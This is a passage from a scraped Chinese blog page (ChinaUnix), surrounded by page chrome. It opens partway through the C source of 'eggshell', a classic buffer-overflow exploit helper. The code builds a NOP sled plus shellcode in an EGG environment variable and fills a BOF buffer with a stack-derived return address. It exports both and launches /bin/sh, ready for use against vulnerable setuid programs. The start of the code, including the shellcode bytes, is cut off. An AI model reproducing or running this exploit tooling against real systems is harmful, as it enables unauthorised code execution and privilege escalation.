c, align=0, eggsize=DEFAULT_EGG_SIZE;<BR><BR>&nbsp; while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)<BR>&nbsp;&nbsp;&nbsp; switch (c) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'a':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; align = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'b':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bsize = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'e':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eggsize = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'o':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offset = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case '?':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp; if (strlen(shellcode) &gt; eggsize) {<BR>&nbsp;&nbsp;&nbsp; printf("Shellcode is larger the the egg.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; if (!(bof = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR>&nbsp; if (!(egg = malloc(eggsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",<BR>&nbsp;&nbsp;&nbsp; bsize, eggsize, align);<BR>&nbsp; printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);<BR><BR>&nbsp; addr_ptr = (long *) bof;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr = egg;<BR>&nbsp; for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)<BR>&nbsp;&nbsp;&nbsp; for (n = 0; n &lt; NOP_SIZE; n++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m = (n + align) % NOP_SIZE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = nop[m];<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; bof[bsize - 1] = '\0';<BR>&nbsp; egg[eggsize - 1] = '\0';<BR><BR>&nbsp; memcpy(egg,"EGG=",4);<BR>&nbsp; putenv(egg);<BR><BR>&nbsp; memcpy(bof,"BOF=",4);<BR>&nbsp; putenv(bof);<BR>&nbsp; system("/bin/sh");<BR>}<BR><BR>void usage(void) {<BR>&nbsp; (void)fprintf(stderr,<BR>&nbsp;&nbsp;&nbsp; "usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offs<BR>et&gt;]\n");<BR>}<BR>------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR></FONT></DIV>           </div>
            <!-- <div class="Blog_con3_1">管理员在2009年8月13日编辑了该文章文章。</div> -->
            <div class="Blog_con2_1 Blog_con3_2">
              <div>
			  <!--<img src="/image/default/tu_8.png">-->
			  <!-- JiaThis Button BEGIN -->
				<div class="bdsharebuttonbox"><A class=bds_more href="#" data-cmd="more"></A><A class=bds_qzone title=分享到QQ空间 href="#" data-cmd="qzone"></A><A class=bds_tsina title=分享到新浪微博 href="#" data-cmd="tsina"></A><A class=bds_tqq title=分享到腾讯微博 href="#" data-cmd="tqq"></A><A class=bds_renren title=分享到人人网 href="#" data-cmd="renren"></A><A class=bds_weixin title=分享到微信 href="#" data-cmd="weixin"></A></div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
				<!-- JiaThis Button END -->
			  </div>
              阅读(327) | 评论(0) | 转发(0) |
			                <div class="HT_line3"></div>
            </div>
            <div class="Blog_con3_3">
              <div><span id='digg_num'>0</span><a href="javascript:void(0)" id='digg' bid='1946139' url='/blog/digg.html' ></a></div>
              <p>上一篇：<a href="/uid-20437758-id-1946138.html">学习c++应该看的书</a></p>
              <p>下一篇：<a href="/uid-20437758-id-1946140.html">学习C++的最大难度</a></p>
            </div>
          </div>
          <div class="Blog_con3_4">
            <div class="Blog_tit2 Blog_tit6">相关热门文章</div>
			            <ul class="Blog_ul7">
						  <li><span class="Blog_span6"></span><a href="http://blog.chinaunix.net/uid-29786672-id-4711563.html" title='“气动隔膜泵结构图”小旋风，席卷泵行业' target='blank' >“气动隔膜泵结构图”小旋风，...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://blog.chinaunix.net/uid-30068108-id-4711136.html" title='三是要严格实施引种隔离' target='blank' >三是要严格实施引种隔离...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://blog.chinaunix.net/uid-29862465-id-4711021.html" title='变压器放大电路的特点及原理详解' target='blank' >变压器放大电路的特点及原理详...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://blog.chinaunix.net/uid-30068108-id-4710935.html" title='冬瓜富村的路子……' target='blank' >冬瓜富村的路子……</a></li>
						  <li><span class="Blog_span6"></span><a href="http://blog.chinaunix.net/uid-30068132-id-4710928.html" title='为企业发展营造良好的外部环境' target='blank' >为企业发展营造良好的外部环境...</a></li>
			            </ul>
			            <ul class="Blog_ul7">
						  <li><span class="Blog_span7"></span><a href="/uid-20330529-id-1703602.html" title='A sample .exrc file for vi editor users' target='blank' >A sample .exrc file for vi e...</a></li>
						  <li><span class="Blog_span7"></span><a href="/uid-10218589-id-348929.html" title='IBM System p5 服务器 HACMP 安装指南' target='blank' >IBM System p5 服务器 HACMP ...</a></li>
						  <li><span class="Blog_span7"></span><a href="/uid-537631-id-2098311.html" title='busybox的httpd使用CGI脚本(BusyBox httpd CGI scripts)' target='blank' >busybox的httpd使用CGI脚本(Bu...</a></li>
						  <li><span class="Blog_span7"></span><a href="/uid-7357143-id-2058354.html" title='Solaris PowerTOP 1.0 发布' target='blank' >Solaris PowerTOP 1.0 发布</a></li>
						  <li><span class="Blog_span7"></span><a href="/uid-400601-id-2408126.html" title='For STKMonitor' target='blank' >For STKMonitor</a></li>
			            </ul>
            <ul class="Blog_ul7">
						  <li><span class="Blog_span6"></span><a href="http://ask.chinaunix.net/question/785702" title='谁能够帮我解决LINUX  2.6  10版本驱动' target='blank'  >谁能够帮我解决LINUX  2.6  10...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://ask.chinaunix.net/question/785701" title='现在的博客积分不会更新了吗？' target='blank'  >现在的博客积分不会更新了吗？...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://ask.chinaunix.net/question/785686" title='shell怎么读取网页内容' target='blank'  >shell怎么读取网页内容...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://ask.chinaunix.net/question/785684" title='ssh等待连接的超时问题' target='blank'  >ssh等待连接的超时问题...</a></li>
						  <li><span class="Blog_span6"></span><a href="http://ask.chinaunix.net/question/785661" title='curl: (56) Recv failure: Connection reset by peer' target='blank'  >curl: (56) Recv failure: Con...</a></li>
			            </ul>
            <div class="clear"></div>
          </div>
		  <!--
          <div class="Blog_con3_4 Blog_con3_5">
            <div class="Blog_tit2 Blog_tit7">热门推荐</div>
            <ul>
			              <li><a href="" title="" target='blank' ></a></li>
			            </ul>
          </div>
		  -->
        </div>
      </div>
      <div class="Blog_right1_7" id='replyList'>
		<div class="Blog_tit3">给主人留下些什么吧！~~</div>
				<!--暂无内容-->
				<!-- 评论分页-->
		<div class="Blog_right1_6 Blog_right1_12">
        		</div>
		<!-- 评论分页-->
        <div class="Blog_right1_10">
          <div class="Blog_tit3">评论热议</div>
		  		 <!--未登录 -->
        <div class="Blog_right1_8">
          <div class="nologin_con1"> 请登录后评论。
            <p><a href="/site/login.html">登录</a> <a href="http://sso.chinaunix.net/Register?return_url=http%3A%2F%2Ft.cublog.com%2F">注册</a></p>
          </div>
        </div>
        <br>
        <div>
            <div style="float:left;margin-left:70px;margin-right:10px;">
             <script type="text/javascript">
            var cpro_id = "u1625692";
            </script>
            <script src="http://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></script>
            </div>
            <div style="margin-left:10px;">
            <script type="text/javascript">
            var cpro_id = "u1625694";
            </script>
            <script src="http://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></script>
            </div>
        </div>
		
        </div>
      </div>
    </div>
  </div>
  <input type='hidden' id='report_url' value='/blog/ViewReport.html' />

<script type="text/javascript">
  	//测试字符串的长度 一个汉字算2个字节
	function mb_strlen(str)
	{
		var len=str.length;
		var totalCount=0;
		for(var i=0;i<len;i++)
		{
			var c = str.charCodeAt(i);
			if ((c >= 0x0001 && c <= 0x007e) || (0xff60<=c && c<=0xff9f)) {
				totalCount++;
			}else{
				totalCount+=2;
			}
		}
		return totalCount;
	}
	/*
	var Util = {};
	Util.calWbText = function (text, max){
		if(max === undefined)
			max = 500;
		var cLen=0;
		var matcher = text.match(/[^\x00-\xff]/g),
			wlen  = (matcher && matcher.length) || 0;
		//匹配url链接正则 http://***
		var pattern = /http:\/\/([\w-]+\.)+[\w-]+(\/*[\w-\.\/\?%&=][^\s^\u4e00-\u9fa5]*)?/gi;
		//匹配的数据存入数组
		var arrPt = new Array();
		var i = 0;
		while((result = pattern.exec(text)) != null){
			arrPt[i] = result[0];
			i++;
		}
		//替换掉原文本中的链接
		for(var j = 0;j<arrPt.length;j++){
			text = text.replace(arrPt[j],"");
		}
		//减掉链接所占的长度
		return Math.floor((max*2 - text.length - wlen)/2 - 12*i);
	};
	*/
	var allowComment = '0';
	
	//举报弹出层
	function showJuBao(url, cid){
		
			$.cover(false);
			asyncbox.open({
				id  : 'report_thickbox',
				url : url,
				title : '举报违规',
				width : 378,
				height : 240,
				scroll : 'no',
				data : {
					'cid'	 : cid,
					'idtype' : 2 
				},
				callback : function(action){
					if(action == 'close'){
						$.cover(false);
					}
				}
			});
	}

	$(function(){

		//创建管理员删除的弹出层
		$('#admin_article_del').click(function(){
			$.cover(false);
			asyncbox.open({
				id : 'class_thickbox',
				html : '<div class="HT_layer3_1"><ul><li class="HT_li1">操作原因：<select class="HT_sel7" id="del_type" name="del_type"><option value="广告文章">广告文章</option><option value="违规内容">违规内容</option><option value="标题不明">标题不明</option><option value="文不对题">文不对题</option></select></li><li class="HT_li1" ><input class="HT_btn4" id="admin_delete"  type="button" /></li></ul></div>',
				title : '选择类型',
				width : 300,
				height : 150,
				scroll : 'no',
				callback : function(action){
					if(action == 'close'){
						$.cover(false);
					}
				}
			});
		});
		$('#admin_delete').live('click' , function(){
			///blog/logicdel/id/3480184/url/%252Fblog%252Findex.html.html
			var type = $('#del_type').val();
			var url = '/blog/logicdel/id/1946139/url/%252Fuid%252F20437758.html.html';
			window.location.href= url + '?type=' + type;
		});


		//顶  js中暂未添加&过滤 
		$('#digg').live('click' , function(){

			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}

			var bid = $('#digg').attr('bid');
			var url = $('#digg').attr('url');

			var digg_str = $.cookie('digg_id');
			if(digg_str != null)
			{
				var arr= new Array(); //定义一数组

				arr = digg_str.split(","); //字符分割     
				for( i=0 ; i < arr.length ; i++ )   
				{   
					if(bid == arr[i])
					{
						showErrorMsg('已经赞过该文章', '消息提示'); 
						return false;
					}
				} 
			}
			$.ajax({
				type:"POST",
				url:url,	
				data: {
					'bid' : bid 
				},
				dataType: 'json',
				success:function(msg){
					if(msg.error == 0)
					{
						var num = parseInt($('#digg_num').html(),10);
						num += 1;
						$('#digg_num').html(num);
						$('#digg').die();

						if(digg_str == null)
						{
							$.cookie('digg_id', bid, {expires: 30 , path: '/'});
						}
						else
						{
							$.cookie('digg_id', digg_str + ',' + bid, {expires: 30 , path: '/'});
						}
						showSucceedMsg('谢谢' , '消息提示');
					}
					else if(msg.error == 1)
					{
						//showErrorMsg(msg.error_content , '消息提示'); 
						showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
					}
					else if(msg.error == 2)
					{
						showErrorMsg(msg.error_content , '消息提示'); 
					}
				}
			});
		});
		//举报弹出层
		/*$('.box_report').live('click' , function(){
			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}
			var url = $('#report_url').val();
			var cid = $(this).attr('cid');
			$.cover(false);
			asyncbox.open({
				id  : 'report_thickbox',
				url : url,
				title : '举报违规',
				width : 378,
				height : 240,
				scroll : 'no',
				data : {
					'cid'	 : cid,
					'idtype' : 2 
				},
				callback : function(action){
					if(action == 'close'){
						$.cover(false);
					}
				}
			});
		});*/


		//评论相关代码
		
		//点击回复显示评论框
		$('.Blog_a10').live('click' , function(){
			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}

			if(allowComment == 1)
			{
				showErrorMsg('该博文不允许评论' , '消息提示'); 
				return false;
			}
			var tid = $(this).attr('toid');//留言作者id
			var bid = $(this).attr('bid');//blogid
			var cid = $(this).attr('cid');//留言id
			var tname = $(this).attr('tname');
			var tpl  = '<div class="Blog_right1_9">';
				tpl +=	 '<div class="div2">';
				tpl +=     '<textarea name="" cols="" rows="" class="Blog_ar1_1" id="rmsg">文明上网，理性发言...</textarea>';
				tpl +=	 '</div>';
				tpl +=   '<div class="div3">';
				tpl +=		'<div class="div3_2"><a href="javascript:void(0);" class="Blog_a11" id="quota_sbumit" url="/Comment/PostComment.html" tid="'+tid+'" bid="'+bid+'" cid="'+cid+'" tname="'+tname+'" ></a><a href="javascript:void(0)" id="qx_comment" class="Blog_a12"></a></div>';
				tpl +=		'<div class="div3_1"><a href="javascript:void(0);" id="mface"><span></span>表情</a></div>';
				tpl +=		'<div class="clear"></div>';
				tpl +=	 '</div>';
				tpl +=  '</div>';
			$('.z_move_comment').html('');
			$(this).parents('.Blog_right1_8').find('.z_move_comment').html(tpl).show();
		});
		//引用的评论提交
		$('#quota_sbumit').live('click' , function(){

			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}

			var bid   = $(this).attr('bid');
			var tid   = $(this).attr('tid');//被引用人的id
			var qid   = $(this).attr('cid');//引用的id
			var url = $(this).attr('url');
			var text = $('#rmsg').val();
			var tname = $(this).attr('tname');
			if(text == '' || text=='文明上网，理性发言...')
			{
				showErrorMsg('评论内容不能为空！' , '消息提示'); 
				return false;
			}
			else
			{
				if(mb_strlen(text) > 1000){
					showErrorMsg('评论内容不能超过500个汉字' , '消息提示'); 
					return false;
				}
			}
		    $.ajax({
		        type: "post",
			    url: url ,
			    data: {'bid': bid , 'to' : tid , 'qid' : qid , 'text': text , 'tname' : tname },
				dataType: 'json',
			    success: function(data){
				    if(data.code == 1){
						var tpl =  '<div class="Blog_right1_8">';
							tpl+=     '<div class="Blog_right_img1"><a href="' +data.info.url+ '" >' + data.info.header + '</a></div>';
							tpl+=     '<div class="Blog_right_font1">';
							tpl+=         '<p class="Blog_p5"><span><a href="' +data.info.url+ '" >' + data.info.username + '</a></span>' + data.info.dateline + '</p>';
							tpl+=         '<p class="Blog_p7"><a href="' + data.info.quota.url + '">' + data.info.quota.username + '</a>：'+ data.info.quota.content + '</p>';
							tpl+=         '<p class="Blog_p8">' + data.info.content + '</p><span class="span_text1"><a href="javascript:void(0);" class="Blog_a10" toid=' + data.info.fuid + ' bid=' + data.info.bid + ' cid=' + data.info.cid + '  tname = ' + data.info.username + ' >回复</a> | 　<a class="comment_del_mark" style="cursor:pointer" url="' + data.info.delurl + '" >删除</a>　| 　<a href="javascript:showJuBao(\'/blog/ViewReport.html\','+data.info.cid+')" class="box_report" cid="' + data.info.cid + '" >举报</a></span></div>';
							tpl+=         '<div class="z_move_comment" style="display:none"></div>';
							tpl+=	      '<div class="Blog_line1"></div></div>';
							$('#replyList .Blog_right1_8:first').before(tpl);
							$('.z_move_comment').html('').hide();
				    }
					else if(data.code == -1){
						//showErrorMsg(data.info , '消息提示'); 
						showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
			        }
                },
			    error: function(){//请求出错处理
                        
                }
			});
		});
		//底部发表评论
		$('#submitmsg').click(function(){
			if(allowComment == 1)
			{
				showErrorMsg('该博文不允许评论' , '消息提示'); 
				return false;
			}
			var bid   = $(this).attr('bid');
			var toid  = $(this).attr('toid');
			var text = $('#reply').val();
			var url = $(this).attr('url');
			if(text == '' || text=='文明上网，理性发言...')
			{
				showErrorMsg('评论内容不能为空！' , '消息提示'); 
				return false;
			}
			else
			{
				if(mb_strlen(text) > 1000){
					showErrorMsg('评论内容不能超过500个汉字' , '消息提示'); 
					return false;
				}
			}
		    $.ajax({
		        type: "post",
			    url: url ,
			    data: {'bid': bid , 'to' : toid ,'text': text},
				dataType: 'json',
			    success: function(data){
				    if(data.code == 1)
					{
						var tpl   = '<div class="Blog_right1_8">';
							tpl  +=   '<div class="Blog_right_img1"><a href="' +data.info.url+ '" >' + data.info.header + '</a></div>';
							tpl  +=	  '<div class="Blog_right_font1">';
							tpl  +=       '<p class="Blog_p5"><span><a href="' +data.info.url+ '" >' + data.info.username + '</a></span>' + data.info.dateline + '</p>';
							tpl  +=       '<p class="Blog_p6">' + data.info.content + '</p>';
							tpl  +=		  '<div class="div1"><a href="javascript:void(0);" class="Blog_a10"  toid=' + data.info.fuid + ' bid=' + data.info.bid + ' cid=' + data.info.cid + '>回复</a> | 　<a class="comment_del_mark" style="cursor:pointer" url="' + data.info.delurl + '">删除</a>　| 　<a href="javascript:showJuBao(\'/blog/ViewReport.html\','+data.info.cid+')" class="box_report" cid="' + data.info.cid + '">举报</a></div>';
							tpl  +=		  '<div class="z_move_comment" style="display:none"></div>';
							tpl  +=    '</div><div class="Blog_line1"></div></div>';
							$('.Blog_tit3:first').after(tpl);
							$('#reply').val('文明上网，理性发言...');
					}
					else if(data.code == -1)
					{
						showErrorMsg(data.info , '消息提示'); 
			        }
                },
			    error: function(){//请求出错处理
                        
                }
		    });
			
		});
		//底部评论重置
		$('#reset_comment').click(function(){
			$('#reply').val('文明上网，理性发言...');
		});
		//取消回复
		$('#qx_comment').live('click' , function(){
			$('.z_move_comment').html('').hide();
		});


		$('#rmsg, #reply').live({
		    focus:function(){
			    if($(this).val() == '文明上网，理性发言...'){
			        $(this).val('');
			    }
			},
			blur:function(){
		        if($(this).val() == ''){
			        $(this).val('文明上网，理性发言...');
			    }
			}
		});
		//删除留言确认
		$('.comment_del_mark').live('click' , function(){
			var url = $(this).attr('url');
			asyncbox.confirm('删除留言','确认', function(action){
				if(action == 'ok')
				{
					location.href = url;
				}
			});
		});
		//删除时间确认
		$('.del_article_id').click(function(){
			var delurl = $(this).attr('delurl');
			asyncbox.confirm('删除文章','确认', function(action){
				if(action == 'ok')
				{
					location.href = delurl;
				}
			});
		});
		/*
		//字数限制
		$('#rmsg, #reply').live('keyup', function(){
			var id = $(this).attr('id');
			var left = Util.calWbText($(this).val(), 500);
			var eid = '#errmsg';
			
			if(id == 'reply') eid =  '#rerrmsg';
			if (left >= 0)
		        $(eid).html('您还可以输入<span>' + left + '</span>字');
		    else
		        $(eid).html('<font color="red">您已超出<span>' + Math.abs(left) + '</span>字 </font>');
		});
		*/
		//加载表情
	    $('#face').qqFace({id : 'facebox1', assign : 'reply', path : '/image/qqface/'});
	    $('#mface').qqFace({id : 'facebox', assign : 'rmsg', path:'/image/qqface/'});
	    
		/*
		$('#class_one_id').change(function(){
			alert(123213);
			var id = parseInt($(this).val() , 10);
			if(id == 0) return false;
			$('.hidden_son_class span').each(function( index , dom ){
				if( dom.attr('cid')  == id )
				{
				}
			});
		});
		*/
		//转载文章
		var turn_url = "/blog/viewClassPart.html";
		$('#repost_bar').click(function(){
			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}
			var id = $(this).attr('bid');
			asyncbox.open({
				id  : 'turn_class_thickbox',
				url : turn_url,
				title : '转载文章',
				width : 330,
				height : 131,
				scroll : 'no',
				data : {
					'id'	 : id
				},
				callback : function(action){
					if(action == 'close'){
						$.cover(false);
					}
				}
			});
		});
		/*
	    //转发文章
	    $('#repost_bar').live('click' , function(){
			if(isOnLine == '' )
			{
				//showErrorMsg('登录之后才能进行此操作' , '消息提示');
				showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				return false;
			}
	    	var bid  = $(this).attr('bid');
	    	var url  = $(this).attr('url');
	    	asyncbox.confirm('转载文章','确认', function(action){
	    	  if(action == 'ok'){
	    	    $.ajax({
				type:"POST",
				url:url,	
				data: {
					'bid' : bid 
				},
				dataType: 'json',
				success:function(msg){
				  if(msg.error == 0){
				    showSucceedMsg('转发成功！', '消息提示');
				  }else if(msg.error == 1){
				    //location.href = '/index.php?r=site/login';
					showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html');
				  }else{
				    showErrorMsg(msg.error_content, '消息提示');
			      }
				}
			  });
	    	  }
	    	});

		});
		*/

	});
</script>
<!--该部分应该放在输出代码块的后面才起作用 -->
<script type="text/javascript">

SyntaxHighlighter.autoloader(
	'applescript			/highlight/scripts/shBrushAppleScript.js',
	'actionscript3 as3		/highlight/scripts/shBrushAS3.js',
	'bash shell				/highlight/scripts/shBrushBash.js',
	'coldfusion cf			/highlight/scripts/shBrushColdFusion.js',
	'cpp c					/highlight/scripts/shBrushCpp.js',
	'c# c-sharp csharp		/highlight/scripts/shBrushCSharp.js',
	'css					/highlight/scripts/shBrushCss.js',
	'delphi pascal			/highlight/scripts/shBrushDelphi.js',
	'diff patch pas			/highlight/scripts/shBrushDiff.js',
	'erl erlang				/highlight/scripts/shBrushErlang.js',
	'groovy					/highlight/scripts/shBrushGroovy.js',
	'java					/highlight/scripts/shBrushJava.js',
	'jfx javafx				/highlight/scripts/shBrushJavaFX.js',
	'js jscript javascript	/highlight/scripts/shBrushJScript.js',
	'perl pl				/highlight/scripts/shBrushPerl.js',
	'php					/highlight/scripts/shBrushPhp.js',
	'text plain				/highlight/scripts/shBrushPlain.js',
	'py python				/highlight/scripts/shBrushPython.js',
	'ruby rails ror rb		/highlight/scripts/shBrushRuby.js',
	'scala					/highlight/scripts/shBrushScala.js',
	'sql					/highlight/scripts/shBrushSql.js',
	'vb vbnet				/highlight/scripts/shBrushVb.js',
	'xml xhtml xslt html	/highlight/scripts/shBrushXml.js'
);
SyntaxHighlighter.all();


function code_hide(id){
	var code = document.getElementById(id).style.display;
	if(code == 'none'){
		document.getElementById(id).style.display = 'block';
	}else{
		document.getElementById(id).style.display = 'none';
	}
}
</script>
  <!-- footer -->
  <div class="Blog_footer" style='clear:both'>
    <div><a href="http://www.chinaunix.net/about/index.shtml" target="_blank" rel="nofollow">关于我们</a> | <a href="http://www.it168.com/bottomfile/it168.shtml" target="_blank" rel="nofollow">关于IT168</a> | <a href="http://www.chinaunix.net/about/connect.html" target="_blank" rel="nofollow">联系方式</a> | <a href="http://www.chinaunix.net/about/service.html" target="_blank" rel="nofollow">广告合作</a> | <a href="http://www.it168.com//bottomfile/flgw/fl.htm" target="_blank" rel="nofollow">法律声明</a> | <a href="http://sso.chinaunix.net/Register?return_url=http%3A%2F%2Fblog.chinaunix.net%2F
" target="_blank" rel="nofollow">免费注册</a>
      <p>Copyright  2001-2010 ChinaUnix.net All Rights Reserved 北京皓辰网域网络信息技术有限公司. 版权所有 </p>
      <div>感谢所有关心和支持过ChinaUnix的朋友们
        <p>京ICP证041476号 京ICP证060528号</p>
      </div>
    </div>
  </div>
</div>
<script language="javascript">

//全局错误提示弹出框
function showErrorMsg(content, title, url){
	var url = url || '';
	var title = title || '消息提示';
	var html = '';
	html += '<div class="HT_layer3_1 HT_layer3_2"><ul><li><p><span class="login_span1"></span>' + content + '</p></li>';
	if(url == '' || url.length == 0){
		html += '<li class="HT_li1"><input type="button" class="HT_btn2"  onclick=\'close_windows("error_msg")\'></li>';	
	} else {
		html += '<li class="HT_li1"><input type="button" class="login_btn1" onclick="location.href=\'' + url + '\'"></li>';
	}
	html += '</ul></div>';
	$.cover(true);
	   asyncbox.open({
		 id: 'error_msg',
		 title : title,
		 html : html,
		 'callback' : function(action){
			 if(action == 'close'){
				 $.cover(false);
			 }
		 }
	});
}

//全局正确提示
function showSucceedMsg(content, title , url ){
	var url = url || '';
	var title = title || '消息提示';
	var html = '';
	html += '<div class="HT_layer3_1 HT_layer3_2"><ul><li><p><span class="login_span2"></span>' + content + '</p></li>';
	if(url == '' || url.length == 0){
		html += '<li class="HT_li1"><input type="button" class="HT_btn2"  onclick=\'close_windows("error_msg")\'></li>';	
	} else {
		html += '<li class="HT_li1"><input type="button" class="HT_btn2" onclick="location.href=\'' + url + '\'"></li>';
	}
	html += '</ul></div>';
	$.cover(true);
	asyncbox.open({
		 id: 'error_msg',
		 title : title,
		 html : html,
		 'callback' : function(action){
			 if(action == 'close'){
				 $.cover(false);
			 }
		 }
	});
}

//关闭指定id的窗口
function close_windows(id){
	$.cover(false);
	$.close(id);
}


//公告
var tID;
var tn;                        // 高度
var nStopTime = 5000;        // 不同行间滚动时间隔的时间，值越小，移动越快
var nSpeed = 50;            // 滚动时，向上移动一像素间隔的时间，值越小，移动越快
var isMove = true;
var nHeight = 25;
var nS = 0;
var nNewsCount = 3;

/**
 * n 用于表示是否为第一次运行
 **/
function moveT(n)
{
    clearTimeout(tID)
    var noticev2 = document.getElementById("noticev2")
    nS = nSpeed;
    
    // 只在第一次调用时运行，初始化环境（有没有参数）
    if (n)
    {
        // 设置行高
        noticev2.style.lineHeight = nHeight + "px";
        // 初始化显示位置
        tn = 0;
        // 刚进入时在第一行停止时间
        nS = nStopTime;
    }
    
    // 判断鼠标是否指向层
    if (isMove)
    {
        // 向上移动一像素
        tn--;
        // 如果移动到最下面一行了，则移到顶行
        if (Math.abs(tn) == nNewsCount * nHeight)
        {
            tn = 0;
        }
        // 设置位置
        noticev2.style.marginTop = tn + "px";
        // 完整显示一行时，停止一段时间
        if (tn % nHeight == 0)
        {
            nS = nStopTime;
        }
    }

    tID = setTimeout("moveT()", nS);
}
moveT(1);    // 此处可以传入任何参数
</script>
<script language="javascript" src="http://stat.it168.com/pv.js"></script>
<script>
function sendPV(){
    var pvTrack = new PvTrack();
    pvTrack.type = 35; // 频道类别ID
    pvTrack.channel = 189; // 频道ID
    pvTrack.pageType = 0;
    pvTrack.track();
}
window.setTimeout("sendPV()", 1000);
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-20237423-2']);
  _gaq.push(['_setDomainName', '.chinaunix.net']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F0ee5e8cdc4d43389b3d1bfd76e83216b' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript" src="/js/jquery.qqFace.js"></script>
</body>
</html>
